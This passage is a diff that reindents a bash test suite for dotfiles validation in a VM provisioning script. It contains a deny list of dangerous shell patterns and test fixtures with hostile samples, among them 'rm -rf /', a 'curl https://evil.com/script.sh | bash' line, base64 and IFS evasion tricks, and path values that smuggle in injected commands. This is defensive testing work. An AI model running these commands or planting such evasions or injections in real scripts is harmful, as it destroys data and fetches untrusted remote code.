@@ -19,198 +19,198 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
 # Test result tracking
 test_result() {
-	local test_name="$1"
-	local expected="$2"
-	local actual="$3"
+    local test_name="$1"
+    local expected="$2"
+    local actual="$3"
 
-	TESTS_RUN=$((TESTS_RUN + 1))
+    TESTS_RUN=$((TESTS_RUN + 1))
 
-	if [ "$expected" = "$actual" ]; then
-		echo -e "${GREEN}✓ PASS${NC}: $test_name"
-		TESTS_PASSED=$((TESTS_PASSED + 1))
-		return 0
-	else
-		echo -e "${RED}✗ FAIL${NC}: $test_name"
-		echo "  Expected: $expected"
-		echo "  Actual: $actual"
-		TESTS_FAILED=$((TESTS_FAILED + 1))
-		return 1
-	fi
+    if [ "$expected" = "$actual" ]; then
+        echo -e "${GREEN}✓ PASS${NC}: $test_name"
+        TESTS_PASSED=$((TESTS_PASSED + 1))
+        return 0
+    else
+        echo -e "${RED}✗ FAIL${NC}: $test_name"
+        echo "  Expected: $expected"
+        echo "  Actual: $actual"
+        TESTS_FAILED=$((TESTS_FAILED + 1))
+        return 1
+    fi
 }
 
 # Setup test environment
 setup_test_env() {
-	TEST_DIR=$(mktemp -d)
-	export TEST_DOTFILES_DIR="$TEST_DIR/dotfiles"
-	export TEST_DOTFILES_WITH_SPACES="$TEST_DIR/my dotfiles"
-	export TEST_SYMLINK_TARGET="$TEST_DIR/real_dotfiles"
-	export TEST_SYMLINK="$TEST_DIR/link_dotfiles"
+    TEST_DIR=$(mktemp -d)
+    export TEST_DOTFILES_DIR="$TEST_DIR/dotfiles"
+    export TEST_DOTFILES_WITH_SPACES="$TEST_DIR/my dotfiles"
+    export TEST_SYMLINK_TARGET="$TEST_DIR/real_dotfiles"
+    export TEST_SYMLINK="$TEST_DIR/link_dotfiles"
 }
 
 # Teardown test environment
 teardown_test_env() {
-	if [ -d "$TEST_DIR" ]; then
-		rm -rf "$TEST_DIR"
-	fi
+    if [ -d "$TEST_DIR" ]; then
+        rm -rf "$TEST_DIR"
+    fi
 }
 
 # Source the validation functions from provision-vm.sh
 # (These will be extracted into separate functions for testing)
 validate_dotfiles_path() {
-	local path="$1"
+    local path="$1"
 
-	# Check if path exists
-	if [ ! -e "$path" ]; then
-		echo "ERROR: Path does not exist"
-		return 1
-	fi
+    # Check if path exists
+    if [ ! -e "$path" ]; then
+        echo "ERROR: Path does not exist"
+        return 1
+    fi
 
-	# Check if path is a directory
-	if [ ! -d "$path" ]; then
-		echo "ERROR: Path is not a directory"
-		return 1
-	fi
+    # Check if path is a directory
+    if [ ! -d "$path" ]; then
+        echo "ERROR: Path is not a directory"
+        return 1
+    fi
 
-	return 0
+    return 0
 }
 
 validate_dotfiles_not_symlink() {
-	local path="$1"
+    local path="$1"
 
-	# CVE-1: Symlink detection (CVSS 9.3)
-	if [ -L "$path" ]; then
-		echo "ERROR: Path is a symlink (security risk)"
-		return 1
-	fi
+    # CVE-1: Symlink detection (CVSS 9.3)
+    if [ -L "$path" ]; then
+        echo "ERROR: Path is a symlink (security risk)"
+        return 1
+    fi
 
-	return 0
+    return 0
 }
 
 validate_install_sh_exists() {
-	local path="$1"
+    local path="$1"
 
-	if [ ! -f "$path/install.sh" ]; then
-		echo "WARNING: install.sh not found"
-		return 1
-	fi
+    if [ ! -f "$path/install.sh" ]; then
+        echo "WARNING: install.sh not found"
+        return 1
+    fi
 
-	return 0
+    return 0
 }
 
 validate_install_sh_safe() {
-	local path="$1"
-	local install_script="$path/install.sh"
+    local path="$1"
+    local install_script="$path/install.sh"
 
-	# CVE-2: install.sh content inspection (CVSS 9.0)
-	# SEC-002: Expanded patterns to prevent evasion (CVSS 7.5)
-	if [ ! -f "$install_script" ]; then
-		return 0 # Already handled by validate_install_sh_exists
-	fi
+    # CVE-2: install.sh content inspection (CVSS 9.0)
+    # SEC-002: Expanded patterns to prevent evasion (CVSS 7.5)
+    if [ ! -f "$install_script" ]; then
+        return 0 # Already handled by validate_install_sh_exists
+    fi
 
-	# Check for dangerous commands
-	local dangerous_patterns=(
-		# Destructive commands
-		"rm.*-rf.*/"
-		"rm -rf /"
-		"dd if="
-		"mkfs\."
-		"> ?/dev/sd"
+    # Check for dangerous commands
+    local dangerous_patterns=(
+        # Destructive commands
+        "rm.*-rf.*/"
+        "rm -rf /"
+        "dd if="
+        "mkfs\."
+        "> ?/dev/sd"
 
-		# Remote code execution
-		"curl.*\|.*(bash|sh)"
-		"wget.*\|.*(bash|sh)"
-		"eval"
-		"exec"
-		"source.*http"
-		"\\. .*http"
+        # Remote code execution
+        "curl.*\|.*(bash|sh)"
+        "wget.*\|.*(bash|sh)"
+        "eval"
+        "exec"
+        "source.*http"
+        "\\. .*http"
 
-		# Privilege escalation
-		":/bin/(ba)?sh"
-		"chown.*root"
-		"chmod.*[67][0-9][0-9]"
-		"sudo"
-		"su "
+        # Privilege escalation
+        ":/bin/(ba)?sh"
+        "chown.*root"
+        "chmod.*[67][0-9][0-9]"
+        "sudo"
+        "su "
 
-		# Obfuscation indicators
-		"\\\\x[0-9a-f]{2}"
-		"base64.*-d.*\|"
-		"xxd"
-		"\\\${IFS}"
-		"\\\$[A-Z_]+.*\\\$[A-Z_]+"
+        # Obfuscation indicators
+        "\\\\x[0-9a-f]{2}"
+        "base64.*-d.*\|"
+        "xxd"
+        "\\\${IFS}"
+        "\\\$[A-Z_]+.*\\\$[A-Z_]+"
 
-		# Network access
-		"nc "
-		"netcat"
-		"socat"
-		"/dev/tcp/"
+        # Network access
+        "nc "
+        "netcat"
+        "socat"
+        "/dev/tcp/"
 
-		# System modification
-		"iptables"
-		"ufw "
-		"systemctl"
-		"service "
+        # System modification
+        "iptables"
+        "ufw "
+        "systemctl"
+        "service "
 
-		# Crypto mining
-		"xmrig"
-		"miner"
-		"stratum"
-	)
+        # Crypto mining
+        "xmrig"
+        "miner"
+        "stratum"
+    )
 
-	for pattern in "${dangerous_patterns[@]}"; do
-		if grep -qE "$pattern" "$install_script" 2>/dev/null; then
-			echo "ERROR: Dangerous pattern detected in install.sh: $pattern"
-			return 1
-		fi
-	done
+    for pattern in "${dangerous_patterns[@]}"; do
+        if grep -qE "$pattern" "$install_script" 2> /dev/null; then
+            echo "ERROR: Dangerous pattern detected in install.sh: $pattern"
+            return 1
+        fi
+    done
 
-	return 0
+    return 0
 }
 
 validate_path_no_shell_injection() {
-	local path="$1"
+    local path="$1"
 
-	# CVE-3: Shell injection prevention (CVSS 7.8)
-	# SEC-003: Comprehensive metacharacter coverage (CVSS 7.0)
-	# Block ALL metacharacters and control chars
-	local pattern='[;\&|`$()<>{}*?#'\''"[:space:][:cntrl:]]|\\|\['
-	if [[ "$path" =~ $pattern ]]; then
-		echo "ERROR: Path contains prohibited characters"
-		return 1
-	fi
+    # CVE-3: Shell injection prevention (CVSS 7.8)
+    # SEC-003: Comprehensive metacharacter coverage (CVSS 7.0)
+    # Block ALL metacharacters and control chars
+    local pattern='[;\&|`$()<>{}*?#'\''"[:space:][:cntrl:]]|\\|\['
+    if [[ "$path" =~ $pattern ]]; then
+        echo "ERROR: Path contains prohibited characters"
+        return 1
+    fi
 
-	# Ensure path is printable ASCII
-	if ! [[ "$path" =~ ^[[:print:]]+$ ]]; then
-		echo "ERROR: Path contains non-printable characters"
-		return 1
-	fi
+    # Ensure path is printable ASCII
+    if ! [[ "$path" =~ ^[[:print:]]+$ ]]; then
+        echo "ERROR: Path contains non-printable characters"
+        return 1
+    fi
 
-	return 0
+    return 0
 }
 
 convert_to_absolute_path() {
-	local path="$1"
+    local path="$1"
 
-	# Handle relative paths
-	if [[ "$path" != /* ]]; then
-		path="$(cd "$path" && pwd)"
-	fi
+    # Handle relative paths
+    if [[ "$path" != /* ]]; then
+        path="$(cd "$path" && pwd)"
+    fi
 
-	echo "$path"
+    echo "$path"
 }
 
 validate_git_repository() {
-	local path="$1"
+    local path="$1"
 
-	# BUG-006: Git repository validation
-	if [ -d "$path/.git" ]; then
-		# Verify it's a valid git repo
-		if ! git -C "$path" rev-parse --git-dir >/dev/null 2>&1; then
-			echo "ERROR: Invalid git repository"
-			return 1
-		fi
-	fi
+    # BUG-006: Git repository validation
+    if [ -d "$path/.git" ]; then
+        # Verify it's a valid git repo
+        if ! git -C "$path" rev-parse --git-dir > /dev/null 2>&1; then
+            echo "ERROR: Invalid git repository"
+            return 1
+        fi
+    fi
 
-	return 0
+    return 0
 }
 
 ##############################################################################
@@ -218,93 +218,93 @@ validate_git_repository() {
 ##############################################################################
 
 test_flag_parsing_no_flag() {
-	echo -e "\n${YELLOW}=== UNIT TESTS: Flag Parsing ===${NC}"
+    echo -e "\n${YELLOW}=== UNIT TESTS: Flag Parsing ===${NC}"
 
-	# Test: Default behavior without --test-dotfiles flag
-	# Expected: Should use default GitHub dotfiles, not local path
-	local result="fail"
-	export TEST_MODE=1
+    # Test: Default behavior without --test-dotfiles flag
+    # Expected: Should use default GitHub dotfiles, not local path
+    local result="fail"
+    export TEST_MODE=1
 
-	# Run script WITHOUT --test-dotfiles flag
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm 2>&1 || true)
+    # Run script WITHOUT --test-dotfiles flag
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm 2>&1 || true)
 
-	# Verify behavior: script should show default GitHub dotfiles
-	if echo "$output" | grep -q "Dotfiles: GitHub (default)"; then
-		result="pass"
-	fi
+    # Verify behavior: script should show default GitHub dotfiles
+    if echo "$output" | grep -q "Dotfiles: GitHub (default)"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	test_result "Default behavior without --test-dotfiles flag" "pass" "$result"
+    unset TEST_MODE
+    test_result "Default behavior without --test-dotfiles flag" "pass" "$result"
 }
 
 test_flag_parsing_with_path() {
-	# Test: --test-dotfiles flag with valid path
-	# Execute script and verify it uses the local dotfiles path
-	setup_test_env
-	mkdir -p "$TEST_DOTFILES_DIR"
-	touch "$TEST_DOTFILES_DIR/install.sh"
+    # Test: --test-dotfiles flag with valid path
+    # Execute script and verify it uses the local dotfiles path
+    setup_test_env
+    mkdir -p "$TEST_DOTFILES_DIR"
+    touch "$TEST_DOTFILES_DIR/install.sh"
 
-	local result="fail"
-	export TEST_MODE=1
+    local result="fail"
+    export TEST_MODE=1
 
-	# Run script with --test-dotfiles flag
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1 || true)
+    # Run script with --test-dotfiles flag
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1 || true)
 
-	# Verify behavior: script outputs that it's using local dotfiles
-	if echo "$output" | grep -q "Dotfiles: $TEST_DOTFILES_DIR (local)"; then
-		result="pass"
-	fi
+    # Verify behavior: script outputs that it's using local dotfiles
+    if echo "$output" | grep -q "Dotfiles: $TEST_DOTFILES_DIR (local)"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	teardown_test_env
-	test_result "Parse --test-dotfiles flag with path argument" "pass" "$result"
+    unset TEST_MODE
+    teardown_test_env
+    test_result "Parse --test-dotfiles flag with path argument" "pass" "$result"
 }
 
 test_flag_parsing_missing_argument() {
-	# Test: --test-dotfiles flag without path argument
-	# Expected: Script should error with usage message
-	# BUG-002: Flag argument validation
-	local result="fail"
-	export TEST_MODE=1
+    # Test: --test-dotfiles flag without path argument
+    # Expected: Script should error with usage message
+    # BUG-002: Flag argument validation
+    local result="fail"
+    export TEST_MODE=1
 
-	# Run script with --test-dotfiles flag but no path (should fail)
-	set +e
-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles 2>&1)
-	local exit_code=$?
-	set -e
+    # Run script with --test-dotfiles flag but no path (should fail)
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles 2>&1)
+    local exit_code=$?
+    set -e
 
-	# Verify behavior: script exits with error and shows usage message
-	if [ $exit_code -ne 0 ] && echo "$output" | grep -q "test-dotfiles flag requires a path argument"; then
-		result="pass"
-	fi
+    # Verify behavior: script exits with error and shows usage message
+    if [ $exit_code -ne 0 ] && echo "$output" | grep -q "test-dotfiles flag requires a path argument"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	test_result "Error when --test-dotfiles flag missing path argument" "pass" "$result"
+    unset TEST_MODE
+    test_result "Error when --test-dotfiles flag missing path argument" "pass" "$result"
 }
 
 test_flag_parsing_multiple_flags() {
-	# Test: Multiple flags in any order
-	# Verify that positional args are preserved when flag is used
-	setup_test_env
-	mkdir -p "$TEST_DOTFILES_DIR"
-	touch "$TEST_DOTFILES_DIR/install.sh"
+    # Test: Multiple flags in any order
+    # Verify that positional args are preserved when flag is used
+    setup_test_env
+    mkdir -p "$TEST_DOTFILES_DIR"
+    touch "$TEST_DOTFILES_DIR/install.sh"
 
-	local result="fail"
-	export TEST_MODE=1
+    local result="fail"
+    export TEST_MODE=1
 
-	# Run script with flag BEFORE vm name
-	output=$("$SCRIPT_DIR/../provision-vm.sh" --test-dotfiles "$TEST_DOTFILES_DIR" custom-vm 2048 4 2>&1 || true)
+    # Run script with flag BEFORE vm name
+    output=$("$SCRIPT_DIR/../provision-vm.sh" --test-dotfiles "$TEST_DOTFILES_DIR" custom-vm 2048 4 2>&1 || true)
 
-	# Verify behavior: VM name, memory, and vcpus are still parsed correctly
-	if echo "$output" | grep -q "VM Name: custom-vm" &&
-		echo "$output" | grep -q "Memory: 2048MB" &&
-		echo "$output" | grep -q "vCPUs: 4"; then
-		result="pass"
-	fi
+    # Verify behavior: VM name, memory, and vcpus are still parsed correctly
+    if echo "$output" | grep -q "VM Name: custom-vm" &&
+        echo "$output" | grep -q "Memory: 2048MB" &&
+        echo "$output" | grep -q "vCPUs: 4"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	teardown_test_env
-	test_result "Parse multiple flags in any order" "pass" "$result"
+    unset TEST_MODE
+    teardown_test_env
+    test_result "Parse multiple flags in any order" "pass" "$result"
 }
 
 ##############################################################################
@@ -312,84 +312,84 @@ test_flag_parsing_multiple_flags() {
 ##############################################################################
 
 test_path_validation_nonexistent() {
-	echo -e "\n${YELLOW}=== UNIT TESTS: Path Validation ===${NC}"
-	setup_test_env
+    echo -e "\n${YELLOW}=== UNIT TESTS: Path Validation ===${NC}"
+    setup_test_env
 
-	# Test: Non-existent path should fail
-	validate_dotfiles_path "/nonexistent/path" 2>&1 && result="pass" || result="fail"
-	test_result "Non-existent path should fail validation" "fail" "$result"
+    # Test: Non-existent path should fail
+    validate_dotfiles_path "/nonexistent/path" 2>&1 && result="pass" || result="fail"
+    test_result "Non-existent path should fail validation" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_path_validation_file_not_directory() {
-	setup_test_env
+    setup_test_env
 
-	# Test: File instead of directory should fail
-	touch "$TEST_DIR/not_a_dir"
-	validate_dotfiles_path "$TEST_DIR/not_a_dir" 2>&1 && result="pass" || result="fail"
-	test_result "File (not directory) should fail validation" "fail" "$result"
+    # Test: File instead of directory should fail
+    touch "$TEST_DIR/not_a_dir"
+    validate_dotfiles_path "$TEST_DIR/not_a_dir" 2>&1 && result="pass" || result="fail"
+    test_result "File (not directory) should fail validation" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_path_validation_valid_directory() {
-	setup_test_env
+    setup_test_env
 
-	# Test: Valid directory should pass
-	mkdir -p "$TEST_DOTFILES_DIR"
-	validate_dotfiles_path "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "Valid directory should pass validation" "pass" "$result"
+    # Test: Valid directory should pass
+    mkdir -p "$TEST_DOTFILES_DIR"
+    validate_dotfiles_path "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "Valid directory should pass validation" "pass" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_path_validation_relative_path() {
-	setup_test_env
+    setup_test_env
 
-	# Test: Relative path should be converted to absolute
-	mkdir -p "$TEST_DOTFILES_DIR"
-	cd "$TEST_DIR" || return
+    # Test: Relative path should be converted to absolute
+    mkdir -p "$TEST_DOTFILES_DIR"
+    cd "$TEST_DIR" || return
 
-	local absolute_path
-	absolute_path=$(convert_to_absolute_path "dotfiles")
+    local absolute_path
+    absolute_path=$(convert_to_absolute_path "dotfiles")
 
-	if [[ "$absolute_path" == /* ]]; then
-		result="pass"
-	else
-		result="fail"
-	fi
+    if [[ "$absolute_path" == /* ]]; then
+        result="pass"
+    else
+        result="fail"
+    fi
 
-	test_result "Relative path should convert to absolute" "pass" "$result"
+    test_result "Relative path should convert to absolute" "pass" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_path_validation_with_spaces() {
-	setup_test_env
+    setup_test_env
 
-	# Test: Path with spaces should be handled correctly
-	# BUG-003: Path quoting for spaces
-	mkdir -p "$TEST_DOTFILES_WITH_SPACES"
-	validate_dotfiles_path "$TEST_DOTFILES_WITH_SPACES" 2>&1 && result="pass" || result="fail"
-	test_result "Path with spaces should be handled correctly" "pass" "$result"
+    # Test: Path with spaces should be handled correctly
+    # BUG-003: Path quoting for spaces
+    mkdir -p "$TEST_DOTFILES_WITH_SPACES"
+    validate_dotfiles_path "$TEST_DOTFILES_WITH_SPACES" 2>&1 && result="pass" || result="fail"
+    test_result "Path with spaces should be handled correctly" "pass" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_path_validation_tilde_expansion() {
-	# Test: Tilde (~) should be expanded to home directory
-	local expanded_path
-	expanded_path="${HOME}/test"
+    # Test: Tilde (~) should be expanded to home directory
+    local expanded_path
+    expanded_path="${HOME}/test"
 
-	# Check if tilde expands correctly
-	if [[ "${expanded_path}" == "${HOME}"* ]]; then
-		result="pass"
-	else
-		result="fail"
-	fi
+    # Check if tilde expands correctly
+    if [[ "${expanded_path}" == "${HOME}"* ]]; then
+        result="pass"
+    else
+        result="fail"
+    fi
 
-	test_result "Tilde (~) should expand to home directory" "pass" "$result"
+    test_result "Tilde (~) should expand to home directory" "pass" "$result"
 }
 
 ##############################################################################
@@ -397,558 +397,558 @@ test_path_validation_tilde_expansion() {
 ##############################################################################
 
 test_security_symlink_detection() {
-	echo -e "\n${YELLOW}=== UNIT TESTS: Security (CVE Mitigations) ===${NC}"
-	setup_test_env
+    echo -e "\n${YELLOW}=== UNIT TESTS: Security (CVE Mitigations) ===${NC}"
+    setup_test_env
 
-	# Test: CVE-1 - Symlink detection (CVSS 9.3)
-	mkdir -p "$TEST_SYMLINK_TARGET"
-	ln -s "$TEST_SYMLINK_TARGET" "$TEST_SYMLINK"
+    # Test: CVE-1 - Symlink detection (CVSS 9.3)
+    mkdir -p "$TEST_SYMLINK_TARGET"
+    ln -s "$TEST_SYMLINK_TARGET" "$TEST_SYMLINK"
 
-	validate_dotfiles_not_symlink "$TEST_SYMLINK" 2>&1 && result="pass" || result="fail"
-	test_result "CVE-1: Symlink should be rejected" "fail" "$result"
+    validate_dotfiles_not_symlink "$TEST_SYMLINK" 2>&1 && result="pass" || result="fail"
+    test_result "CVE-1: Symlink should be rejected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_symlink_component_in_path() {
-	setup_test_env
+    setup_test_env
 
-	# Test: CVE-1 - Symlink component in path
-	mkdir -p "$TEST_SYMLINK_TARGET/subdir"
-	ln -s "$TEST_SYMLINK_TARGET" "$TEST_SYMLINK"
+    # Test: CVE-1 - Symlink component in path
+    mkdir -p "$TEST_SYMLINK_TARGET/subdir"
+    ln -s "$TEST_SYMLINK_TARGET" "$TEST_SYMLINK"
 
-	# Check if any component in the path is a symlink
-	local path_to_check="$TEST_SYMLINK/subdir"
-	local current_path=""
-	local is_symlink="false"
+    # Check if any component in the path is a symlink
+    local path_to_check="$TEST_SYMLINK/subdir"
+    local current_path=""
+    local is_symlink="false"
 
-	IFS='/' read -ra PARTS <<<"$path_to_check"
-	for part in "${PARTS[@]}"; do
-		if [ -n "$part" ]; then
-			current_path="${current_path}/${part}"
-			if [ -L "$current_path" ]; then
-				is_symlink="true"
-				break
-			fi
-		fi
-	done
+    IFS='/' read -ra PARTS <<< "$path_to_check"
+    for part in "${PARTS[@]}"; do
+        if [ -n "$part" ]; then
+            current_path="${current_path}/${part}"
+            if [ -L "$current_path" ]; then
+                is_symlink="true"
+                break
+            fi
+        fi
+    done
 
-	if [ "$is_symlink" = "true" ]; then
-		result="fail"
-	else
-		result="pass"
-	fi
+    if [ "$is_symlink" = "true" ]; then
+        result="fail"
+    else
+        result="pass"
+    fi
 
-	test_result "CVE-1: Symlink in path component should be detected" "fail" "$result"
+    test_result "CVE-1: Symlink in path component should be detected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_install_sh_dangerous_commands() {
-	setup_test_env
+    setup_test_env
 
-	# Test: CVE-2 - install.sh content inspection (CVSS 9.0)
-	mkdir -p "$TEST_DOTFILES_DIR"
-	cat >"$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    # Test: CVE-2 - install.sh content inspection (CVSS 9.0)
+    mkdir -p "$TEST_DOTFILES_DIR"
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 rm -rf /
 EOF
 
-	validate_install_sh_safe "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "CVE-2: Dangerous command 'rm -rf /' should be detected" "fail" "$result"
+    validate_install_sh_safe "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "CVE-2: Dangerous command 'rm -rf /' should be detected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_install_sh_curl_pipe_bash() {
-	setup_test_env
+    setup_test_env
 
-	# Test: CVE-2 - Detect curl | bash pattern
-	mkdir -p "$TEST_DOTFILES_DIR"
-	cat >"$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    # Test: CVE-2 - Detect curl | bash pattern
+    mkdir -p "$TEST_DOTFILES_DIR"
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 curl https://evil.com/script.sh | bash
 EOF
 
-	validate_install_sh_safe "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "CVE-2: Dangerous 'curl | bash' pattern should be detected" "fail" "$result"
+    validate_install_sh_safe "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "CVE-2: Dangerous 'curl | bash' pattern should be detected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_install_sh_safe_content() {
-	setup_test_env
+    setup_test_env
 
-	# Test: CVE-2 - Safe install.sh should pass
-	mkdir -p "$TEST_DOTFILES_DIR"
-	cat >"$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    # Test: CVE-2 - Safe install.sh should pass
+    mkdir -p "$TEST_DOTFILES_DIR"
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 echo "Installing dotfiles..."
 ln -sf ~/.dotfiles/.zshrc ~/.zshrc
 EOF
 
-	validate_install_sh_safe "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "CVE-2: Safe install.sh content should pass validation" "pass" "$result"
+    validate_install_sh_safe "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "CVE-2: Safe install.sh content should pass validation" "pass" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_pattern_evasion_variable_expansion() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-002 - Pattern evasion via variable expansion
-	mkdir -p "$TEST_DOTFILES_DIR"
-	cat >"$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    # Test: SEC-002 - Pattern evasion via variable expansion
+    mkdir -p "$TEST_DOTFILES_DIR"
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 CMD="rm -rf"
 TARGET="/"
 $CMD $TARGET
 EOF
 
-	validate_install_sh_safe "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-002: Variable expansion evasion should be detected" "fail" "$result"
+    validate_install_sh_safe "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-002: Variable expansion evasion should be detected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_pattern_evasion_base64() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-002 - Pattern evasion via base64 encoding
-	mkdir -p "$TEST_DOTFILES_DIR"
-	cat >"$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    # Test: SEC-002 - Pattern evasion via base64 encoding
+    mkdir -p "$TEST_DOTFILES_DIR"
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 echo "cm0gLXJmIC8K" | base64 -d | bash
 EOF
 
-	validate_install_sh_safe "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-002: Base64 encoding evasion should be detected" "fail" "$result"
+    validate_install_sh_safe "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-002: Base64 encoding evasion should be detected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_pattern_evasion_whitespace_ifs() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-002 - Pattern evasion via IFS whitespace trick
-	mkdir -p "$TEST_DOTFILES_DIR"
-	cat >"$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    # Test: SEC-002 - Pattern evasion via IFS whitespace trick
+    mkdir -p "$TEST_DOTFILES_DIR"
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 rm${IFS}-rf${IFS}/
 EOF
 
-	validate_install_sh_safe "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-002: IFS whitespace evasion should be detected" "fail" "$result"
+    validate_install_sh_safe "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-002: IFS whitespace evasion should be detected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_pattern_evasion_eval() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-002 - Eval command should be detected
-	mkdir -p "$TEST_DOTFILES_DIR"
-	cat >"$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    # Test: SEC-002 - Eval command should be detected
+    mkdir -p "$TEST_DOTFILES_DIR"
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 eval "rm -rf /tmp/evil"
 EOF
 
-	validate_install_sh_safe "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-002: Eval command should be detected" "fail" "$result"
+    validate_install_sh_safe "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-002: Eval command should be detected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_pattern_evasion_sudo() {
-	setup_test_env
+    setup_test_env
 
-	# Test: SEC-002 - Sudo privilege escalation should be detected
-	mkdir -p "$TEST_DOTFILES_DIR"
-	cat >"$TEST_DOTFILES_DIR/install.sh" <<'EOF'
+    # Test: SEC-002 - Sudo privilege escalation should be detected
+    mkdir -p "$TEST_DOTFILES_DIR"
+    cat > "$TEST_DOTFILES_DIR/install.sh" << 'EOF'
 #!/bin/bash
 sudo chown root:root /etc/passwd
 EOF
 
-	validate_install_sh_safe "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
-	test_result "SEC-002: Sudo privilege escalation should be detected" "fail" "$result"
+    validate_install_sh_safe "$TEST_DOTFILES_DIR" 2>&1 && result="pass" || result="fail"
+    test_result "SEC-002: Sudo privilege escalation should be detected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_shell_injection_semicolon() {
-	setup_test_env
+    setup_test_env
 
-	# Test: CVE-3 - Shell injection prevention (CVSS 7.8)
-	local malicious_path="/tmp/dotfiles; rm -rf /"
-	validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
-	test_result "CVE-3: Path with semicolon should be rejected" "fail" "$result"
+    # Test: CVE-3 - Shell injection prevention (CVSS 7.8)
+    local malicious_path="/tmp/dotfiles; rm -rf /"
+    validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
+    test_result "CVE-3: Path with semicolon should be rejected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_shell_injection_pipe() {
-	setup_test_env
+    setup_test_env
 
-	# Test: CVE-3 - Shell injection with pipe
-	local malicious_path="/tmp/dotfiles | cat /etc/passwd"
-	validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
-	test_result "CVE-3: Path with pipe should be rejected" "fail" "$result"
+    # Test: CVE-3 - Shell injection with pipe
+    local malicious_path="/tmp/dotfiles | cat /etc/passwd"
+    validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
+    test_result "CVE-3: Path with pipe should be rejected" "fail" "$result"
 
-	teardown_test_env
+    teardown_test_env
 }
 
 test_security_shell_injection_backtick() {
-	setup_test_env
+    setup_test_env
 
-	# Test: CVE-3 - Shell injection with backtick
-	local malicious_path="/tmp/\`whoami\`"
-	validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
-	test_result "CVE-3: Path with backtick should be rejected" "fail" "$result"
+    # Test: CVE-3 - Shell injection with backtick
+    local malicious_path="/tmp/\`whoami\`"
+    validate_path_no_shell_injection "$malicious_path" 2>&1 && result="pass" || result="fail"
